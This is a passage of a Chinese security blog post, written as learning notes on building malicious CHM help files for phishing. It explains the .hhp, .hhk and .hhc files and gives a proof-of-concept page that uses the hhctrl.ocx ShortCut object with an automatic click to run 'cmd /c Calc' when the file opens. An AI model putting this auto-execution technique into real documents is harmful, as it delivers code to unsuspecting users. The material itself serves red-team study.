<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="关于CHM文件的学习。">
<meta property="og:type" content="article">
<meta property="og:title" content="【钓鱼从入门到放弃】-CHM文件笔记">
<meta property="og:url" content="https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
<meta property="og:description" content="关于CHM文件的学习。">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:29:34-_dkiyBX_CHMFile_0_dkiyBX_1642066174124_dkiyBX_CHMFile_0.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:29:54-_apeq0N_CHMFile_1_apeq0N_1642066194260_apeq0N_CHMFile_1.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:30:10-_hHOWqf_CHMFile_2_hHOWqf_1642066210880_hHOWqf_CHMFile_2.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:30:28-_NSU9Jf_CHMFile_3_NSU9Jf_1642066228239_NSU9Jf_CHMFile_3.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:30:41-_BmKKC0_CHMFile_4_BmKKC0_1642066241452_BmKKC0_CHMFile_4.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:30:50-_VXNiKh_CHMFile_5_VXNiKh_1642066250169_VXNiKh_CHMFile_5.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:27:50-_iHt0rU_CHM-MyJSRAT_iHt0rU_1642066070926_iHt0rU_CHM-MyJSRAT.gif">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:31:10-_gt2kjS_CHMFile_6_gt2kjS_1642066270004_gt2kjS_CHMFile_6.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:28:21-_7xPsaP_images-blog_2022-01-08_at_4_7xPsaP_1642066101345_7xPsaP_images-blog_2022-01-08_at_4.gif">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:31:30-_cjldIq_CHMFile_7_cjldIq_1642066290161_cjldIq_CHMFile_7.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-17:31:45-_hruriY_CHMFile_8_hruriY_1642066305551_hruriY_CHMFile_8.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220113-16:49:14-_LszqMG_images-blog%202022-01-13%20at%204_LszqMG_1642063754231_LszqMG_images-blog%202022-01-13%20at%204.gif">
<meta property="article:published_time" content="2022-01-13T09:20:49.000Z">
<meta property="article:modified_time" content="2023-12-07T07:27:58.000Z">
<meta property="article:author" content="atsud0">
<meta property="article:tag" content="CHM">
<meta property="article:tag" content="Pishing">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.atsud0.me/images/post/20220113-17:29:34-_dkiyBX_CHMFile_0_dkiyBX_1642066174124_dkiyBX_CHMFile_0.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
          
        
      
    
    <!-- title -->
    <title>【钓鱼从入门到放弃】-CHM文件笔记</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-163969429-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/FRP%E6%94%B9%E9%80%A0%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CPL%E6%96%87%E4%BB%B6/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&text=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&title=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=【钓鱼从入门到放弃】-CHM文件笔记&body=Check out this article: https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&title=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&name=【钓鱼从入门到放弃】-CHM文件笔记&description=&lt;p&gt;关于CHM文件的学习。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/%E3%80%90%E9%92%93%E9%B1%BC%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E3%80%91-CHM%E6%96%87%E4%BB%B6%E7%AC%94%E8%AE%B0/&t=【钓鱼从入门到放弃】-CHM文件笔记"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x00 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">2.</span> <span class="toc-text">0x01 前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hhp-%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-number">2.1.</span> <span class="toc-text">hhp-配置文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html"><span class="toc-number">2.2.</span> <span class="toc-text">html</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hhk-%E7%B4%A2%E5%BC%95%E9%A1%B5%E9%9D%A2%E5%9C%B0%E5%9B%BE"><span class="toc-number">2.3.</span> <span class="toc-text">hhk-索引页面地图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hhc-%E7%9B%AE%E5%BD%95%E9%A1%B5%E9%9D%A2%E5%9C%B0%E5%9B%BE"><span class="toc-number">2.4.</span> <span class="toc-text">hhc-目录页面地图</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%96%E8%AF%91CHM%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.</span> <span class="toc-text">编译CHM文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E7%BC%96%E8%AF%91CHM%E6%96%87%E4%BB%B6"><span class="toc-number">2.6.</span> <span class="toc-text">反编译CHM文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E7%9C%9F%E5%AE%9E%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">0x02 真实案例分析</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-%E5%9F%BA%E7%A1%80%E6%94%BB%E5%87%BB%E6%96%B9%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">0x03 基础攻击方式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8hhctrl-ocx%E5%AF%B9%E8%B1%A1%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.1.</span> <span class="toc-text">利用hhctrl.ocx对象命令执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E6%96%87%E4%BB%B6%E5%B9%B6%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">释放文件并执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ActiveXObject"><span class="toc-number">4.3.</span> <span class="toc-text">ActiveXObject</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%B7%A5%E5%85%B7%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">0x04 工具利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NISHANG-Out-CHM"><span class="toc-number">5.1.</span> <span class="toc-text">NISHANG Out-CHM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MyJSRat"><span class="toc-number">5.2.</span> <span class="toc-text">MyJSRat</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DotNetToJScript"><span class="toc-number">5.3.</span> <span class="toc-text">DotNetToJScript</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E2%80%9C%E8%94%93%E7%81%B5%E8%8A%B1%E2%80%9D%E7%BB%84%E7%BB%87CHM%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95%E5%A4%8D%E7%8E%B0"><span class="toc-number">6.</span> <span class="toc-text">0x05 “蔓灵花”组织CHM利用方法复现</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%B0%8F%E7%BB%93"><span class="toc-number">7.</span> <span class="toc-text">0x06 小结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">8.</span> <span class="toc-text">0x07 参考资料</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        【钓鱼从入门到放弃】-CHM文件笔记
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">atsud0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-01-13T09:20:49.000Z" class="dt-published" itemprop="datePublished">2022-01-13</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Note/">Note</a> › <a class="category-link" href="/categories/Note/%E9%92%93%E9%B1%BC/">钓鱼</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/CHM/" rel="tag">CHM</a>, <a class="p-category" href="/tags/Pishing/" rel="tag">Pishing</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p>关于CHM文件的学习。</p>
<span id="more"></span>
<h1 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00 简介"></a>0x00 简介</h1><p>微软HTML帮助集，即编译的HTML帮助文件（英语：Microsoft Compiled HTML Help, CHM），是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%BE%AE%E8%BB%9F">微软</a>继承早先的<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/WinHelp">WinHelp</a>发展的一种<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%AA%94%E6%A1%88%E6%A0%BC%E5%BC%8F">文件格式</a>，用来提供<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E7%B7%9A%E4%B8%8A%E5%B9%AB%E5%8A%A9&action=edit&redlink=1">在线帮助</a>，是一种应用较广泛的文件格式。因为CHM文件如一本书一样，可以提供内容目录、索引和搜索等功能。CHM帮助文件通常可以使用RAR等压缩文件格式打开。</p>
<p>当攻击者利用此文件进行攻击时，通常会在CHM文件内包含恶意脚本和恶意文件，用户打开CHM文件时就会触发恶意代码执行。nishang等框架支持生成CHM的恶意恶意利用。本文介绍了如何手动制作CHM，并梳理了常见的攻击利用方式。</p>
<h1 id="0x01-前置知识"><a href="#0x01-前置知识" class="headerlink" title="0x01 前置知识"></a>0x01 前置知识</h1><p>需要下载HTML Help Workshop生成CHM文件，但是微软官方的链接已经失效了。</p>
<p>下载链接：<a target="_blank" rel="noopener" href="https://www.helpandmanual.com/downloads_mscomp.html">https://www.helpandmanual.com/downloads_mscomp.html</a></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> shasum <span class="literal">-a</span> <span class="number">256</span> ~/Downloads/htmlhelp.exe</span><br><span class="line">cf8fe5a02d3c2bf0c8728dd399dc3b2587c4139ffb23ef4268f34535a6157b87  ~/Downloads/htmlhelp.exe</span><br></pre></td></tr></table></figure>

<p>由于是第三方网站，所以这里贴出virustotal检测的链接：<a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/cf8fe5a02d3c2bf0c8728dd399dc3b2587c4139ffb23ef4268f34535a6157b87/detection">https://www.virustotal.com/gui/file/cf8fe5a02d3c2bf0c8728dd399dc3b2587c4139ffb23ef4268f34535a6157b87/detection</a></p>
<p>安装之后会提示已经有最新的<code>HTML HELP</code>版本了，那个可以忽略不管。</p>
<p>CHM文件是由hhp、html、hhk、hhc以及其他资源文件（如jpeg、png）等文件组成的。</p>
<h2 id="hhp-配置文件"><a href="#hhp-配置文件" class="headerlink" title="hhp-配置文件"></a>hhp-配置文件</h2><p>hhp文件是在编译时用到的主要文件。可以将它理解为CHM的配置文件，里面包含了首页和默认页、要打包的文件等信息。</p>
<h3 id="Example"><a href="#Example" class="headerlink" title="Example"></a>Example</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[OPTIONS] </span><br><span class="line">Compatibility=1.1 or later</span><br><span class="line">Compiled file=PocCalc.chm                 </span><br><span class="line">Contents file=Table of Contents.hhc       </span><br><span class="line">Index file=Index.hhk                      </span><br><span class="line">Default topic=poc.html                    </span><br><span class="line">Title=PocCalc                             </span><br><span class="line">Display compile progress=No</span><br><span class="line">Language=0x410 Italian (Italy)</span><br><span class="line">Full-text search=Yes                </span><br><span class="line"></span><br><span class="line">[FILES] </span><br><span class="line">poc.html                                  </span><br><span class="line">Test7Z1.exe</span><br><span class="line"></span><br><span class="line">[INFOTYPES]</span><br></pre></td></tr></table></figure>

<h2 id="html"><a href="#html" class="headerlink" title="html"></a>html</h2><p>HTML格式文件用来存储CHM帮助文件中的文本、图片、 按钮、以及快捷方式等方式。</p>
<p>攻击者一般会通过<code>ShortCut</code>的方式添加执行的恶意命令，在Item1的Value参数中指定运行的进程和参数。</p>
<h3 id="ShortCut-Syntax"><a href="#ShortCut-Syntax" class="headerlink" title="ShortCut-Syntax"></a>ShortCut-Syntax</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">PARAM</span>  <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span>  <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span>   <span class="attr">value</span>=<span class="string">&quot;,&lt;i&gt;program name&lt;/i&gt;,&lt;i&gt;parameters&lt;/i&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PARAM</span>  <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span>   <span class="attr">value</span>=<span class="string">&quot;&lt;i&gt;message ID&lt;/i&gt;,&lt;i&gt;wPARAM&lt;/i&gt;,&lt;i&gt;lPARAM&lt;/i&gt;&quot;</span>&gt;</span></span><br><span class="line">[<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span>  <span class="attr">value</span>=<span class="string">&quot;[Text: &lt;i&gt;Button text&lt;/i&gt;|Bitmap: &lt;i&gt;Bitmap file path&lt;/i&gt;|Icon:&lt;i&gt;Icon file path&lt;/i&gt;]&quot;</span>&gt;</span>]</span><br><span class="line">[<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Font&quot;</span>    <span class="attr">value</span>=<span class="string">&quot;&lt;i&gt;Facename[, point size[, charset[, color[, PLAIN BOLD ITALIC UNDERLINE]]]]&lt;/i&gt;&quot;</span>&gt;</span>]</span><br><span class="line">[<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Text&quot;</span>    <span class="attr">value</span>=<span class="string">&quot;Text: &lt;i&gt;Link text&lt;/i&gt;&quot;</span>&gt;</span>]</span><br></pre></td></tr></table></figure>

<h3 id="ShortCut-Example"><a href="#ShortCut-Example" class="headerlink" title="ShortCut-Example"></a>ShortCut-Example</h3><p>利用hhctrl.ocx对象命令执行去弹CMD-代码示例。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>calc poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	command exec</span><br><span class="line">	<span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">id</span>=<span class="string">x</span> <span class="attr">classid</span>=<span class="string">&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot;</span> <span class="attr">width</span>=<span class="string">1</span> <span class="attr">height</span>=<span class="string">1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Command&quot;</span> <span class="attr">value</span>=<span class="string">&quot;ShortCut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Button&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Bitmap::shortcut&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item1&quot;</span> <span class="attr">value</span>=<span class="string">&#x27;,cmd /c, Calc&#x27;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">PARAM</span> <span class="attr">name</span>=<span class="string">&quot;Item2&quot;</span> <span class="attr">value</span>=<span class="string">&quot;273,1,1&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">SCRIPT</span>&gt;</span>x.Click();<span class="tag">&lt;/<span class="name">SCRIPT</span>&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">	</span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="hhk-索引页面地图"><a href="#hhk-索引页面地图" class="headerlink" title="hhk-索引页面地图"></a>hhk-索引页面地图</h2><p>hhk文件是html格式的文件，用于保存CHM中关键字索引目录的内容， 在<code>&lt;BODY&gt;</code>标签中以列举所有需要嵌入到chm文件中的附件文件对象，对象包含对象名Name和编译对象所在路径Local两个参数，设置的对象会在编译的时候编译到chm文件中。该文件在编译CHM文件过程中可忽略。</p>
<h3 id="Example-1"><a href="#Example-1" class="headerlink" title="Example"></a>Example</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;GENERATOR&quot;</span> <span class="attr">content</span>=<span class="string">&quot;Microsoft® HTML Help Workshop 4.1&quot;</span>&gt;</span></span><br><span class="line">   <span class="comment">&lt;!-- Sitemap 1.0 --&gt;</span> </span><br><span class="line">   <span class="tag">&lt;/<span class="name">HEAD</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">BODY</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">UL</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">LI</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Hello&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;poc.html&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span> </span><br><span class="line">   <span class="tag">&lt;<span class="name">LI</span>&gt;</span><span class="tag">&lt;<span class="name">OBJECT</span> <span class="attr">type</span>=<span class="string">&quot;text/sitemap&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Name&quot;</span> <span class="attr">value</span>=<span class="string">&quot;World&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">param</span> <span class="attr">name</span>=<span class="string">&quot;Local&quot;</span> <span class="attr">value</span>=<span class="string">&quot;poc.html&quot;</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;/<span class="name">OBJECT</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">UL</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">BODY</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">HTML</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="hhc-目录页面地图"><a href="#hhc-目录页面地图" class="headerlink" title="hhc-目录页面地图"></a>hhc-目录页面地图</h2><p>hhc文件是html格式的文件，用于保存CHM中目录页面索引的内容，在hhc文件中，用<code>&lt;UL&gt;</code>和<code>&lt;LI&gt;</code>两个标签定义了带有层级关系中列表,并在其中以<code>&lt;OBJECT&gt;</code>的形式嵌入了html页面对象。利用列表的层级关系，构造了最终chm文件的层级关系。</p>
<h3 id="Example-2"><a href="#Example-2" class="headerlink" title="Example"></a>Example</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//IETF//DTD HTML//EN&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">HTML</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">HEAD</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span 